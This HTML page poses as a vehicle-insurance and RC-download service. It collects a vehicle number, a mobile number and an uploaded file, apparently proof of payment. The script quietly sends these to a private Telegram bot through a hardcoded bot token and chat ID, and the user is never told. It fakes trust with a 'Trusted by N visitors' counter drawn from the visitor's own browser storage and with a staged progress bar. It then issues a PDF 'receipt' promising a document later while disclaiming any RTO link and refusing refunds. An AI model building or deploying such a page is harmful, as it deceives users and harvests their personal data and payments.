<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mishra Insurance Service</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}
body{
background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
background-size:400% 400%;
animation:bg 8s infinite;
display:flex;flex-direction:column;align-items:center;
}
@keyframes bg{
0%{background-position:0%}
50%{background-position:100%}
100%{background-position:0%}
}
.topbar{
position:fixed;top:0;width:100%;
background:#fff;padding:10px 20px;
display:flex;justify-content:flex-end;
}
.homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px;margin-right:10px}

.menu-icon div{
width:25px;height:3px;background:#ff0066;margin:5px 0;
}
.sideMenu{
position:fixed;right:-260px;top:0;width:250px;height:100%;
background:#fff;padding-top:80px;transition:0.3s;
}
.sideMenu button{
width:90%;margin:10px 5%;padding:12px;border:none;
background:#ff0066;color:#fff;border-radius:8px;
}
.openMenu{right:0}

.card{
margin-top:110px;
background:rgba(255,255,255,0.2);
padding:20px;border-radius:15px;
width:90%;max-width:400px;text-align:center;
}

input{width:100%;padding:12px;margin-top:12px;border-radius:8px;border:none}

button{
width:100%;padding:12px;margin-top:10px;
border:none;border-radius:8px;
background:#000;color:#fff;
box-shadow:0 5px 0 #333;
}
button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}

.hidden{display:none}

/* LOADER */
.loader{
position:fixed;top:0;left:0;width:100%;height:100%;
background:#fff;display:none;
flex-direction:column;justify-content:center;align-items:center;
}
.barBox{width:80%;background:#ddd;border-radius:10px}
.bar{width:0%;height:20px;background:#ff0066}
.text{margin-top:10px;color:#000;font-weight:bold}

/* POPUP */
.popup{
position:fixed;top:50%;left:50%;
transform:translate(-50%,-50%);
background:#fff;padding:20px;border-radius:12px;
display:none;text-align:center;
}
</style>
</head>

<body>

<div class="topbar">
<button class="homeBtn" onclick="location.reload()">🏠</button>
<div onclick="toggleMenu()" class="menu-icon">
<div></div><div></div><div></div>
</div>
</div>

<div class="sideMenu" id="menu">
<button onclick="openInsurance()">Insurance</button>
<button>About</button>
<button>Disclaimer</button>
<button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
</div>

<div id="visitorCount" style="color:#fff;margin-top:70px;font-weight:bold;"></div>

<div class="card">
<div id="page1">
<h2>Vehicle Number</h2>
<input id="vehicle" oninput="formatVehicle(this)">
<button onclick="goNext()">Continue</button>
</div>

<div id="page2" class="hidden">
<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">
<button onclick="submitForm()">Submit</button>
</div>
</div>

<div class="loader" id="loader">
<div class="barBox"><div class="bar" id="bar"></div></div>
<div class="text" id="percent">0%</div>
<div class="text">इंटरनेट धीमा है, कृपया BACK बटन न दबाएं</div>
</div>

<div class="popup" id="popup">
<h2>🎉 Congratulations</h2>
<p>आपका PDF डाउनलोड हो गया है</p>
<button onclick="location.reload()">OK</button>
</div>

<script>

/* VISITOR */
let c=localStorage.getItem("visitors")||0;
c++;localStorage.setItem("visitors",c);
visitorCount.innerText="Trusted by "+c+" visitors";

/* MENU */
function toggleMenu(){menu.classList.toggle("openMenu");}
function openInsurance(){
window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
}

/* FORMAT */
function formatVehicle(input){
let v=input.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
if(v.length>2) v=v.slice(0,2)+"-"+v.slice(2);
if(v.length>5) v=v.slice(0,5)+"-"+v.slice(5);
if(v.length>8) v=v.slice(0,8)+"-"+v.slice(8,12);
input.value=v;
}

function goNext(){
page1.classList.add("hidden");
page2.classList.remove("hidden");
}

/* PDF */
function downloadPDF(){

let v=vehicle.value,m=mobile.value;
let d=new Date();
let txn="TXN"+Math.floor(Math.random()*999999);
let count=localStorage.getItem("visitors");

let canvas=document.createElement("canvas");
canvas.width=600;canvas.height=1000;
let ctx=canvas.getContext("2d");

ctx.fillStyle="#fff";ctx.fillRect(0,0,600,1000);

/* BORDER */
ctx.lineWidth=6;ctx.strokeRect(5,5,590,990);
ctx.lineWidth=2;ctx.strokeRect(15,15,570,970);

/* HEADER */
ctx.fillStyle="#005BAC";ctx.fillRect(5,5,590,70);
ctx.fillStyle="#fff";ctx.font="italic bold 26px Arial";
ctx.textAlign="center";ctx.fillText("RCPDF.IN",300,45);

/* BOX */
ctx.strokeRect(40,120,520,250);

ctx.textAlign="left";ctx.font="16px Arial";
ctx.fillText("Vehicle: "+v,60,160);
ctx.fillText("Mobile: "+m,60,190);
ctx.fillText("Work: RC Download",60,220);
ctx.fillText("Transaction ID: "+txn,60,250);
ctx.fillText("Date: "+d.toLocaleDateString(),60,280);
ctx.fillText("Time: "+d.toLocaleTimeString(),60,310);
ctx.fillText("Trusted by "+count+" visitors",60,340);

/* TERMS FULL */
ctx.font="12px Arial";
let y=420;

ctx.fillText("• Yeh website kisi bhi tarah se RTO se juda hua nahi hai",40,y); y+=22;
ctx.fillText("• Hum jaankari ki puri tarah se sahi hone ki koi pusti nahi karte",40,y); y+=22;
ctx.fillText("• Yeh site sirf jaankari purpose ke liye hai",40,y); y+=22;
ctx.fillText("• Kisi bhi tarah ka galat istemal karne ki jimmedari user ki hogi",40,y); y+=22;
ctx.fillText("• PDF request ke baad amount refund nahi kiya jayega",40,y); y+=22;
ctx.fillText("• Grahak ne payment kiya hai to sabhi sharton ki jimmedari grahak ki hogi",40,y); y+=22;
ctx.fillText("• Aapko RC ki PDF jald hi aapke diye gaye mobile number par bhej di jayegi",40,y);

const { jsPDF } = window.jspdf;
let pdf=new jsPDF();
pdf.addImage(canvas.toDataURL(),"PNG",0,0,210,297);
pdf.save("RC_PDF.pdf");
}

/* SUBMIT */
function submitForm(){

if(!proof.files[0]){alert("Upload file");return;}

loader.style.display="flex";

let p=0;
let interval=setInterval(()=>{
p++;
bar.style.width=p+"%";
percent.innerText=p+"%";

if(p>=100){
clearInterval(interval);

downloadPDF();

let data=new FormData();
data.append("chat_id","5600045707");
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
{method:"POST",body:data});

loader.style.display="none";
popup.style.display="block";
}
},40);
}

</script>

</body>
</html>
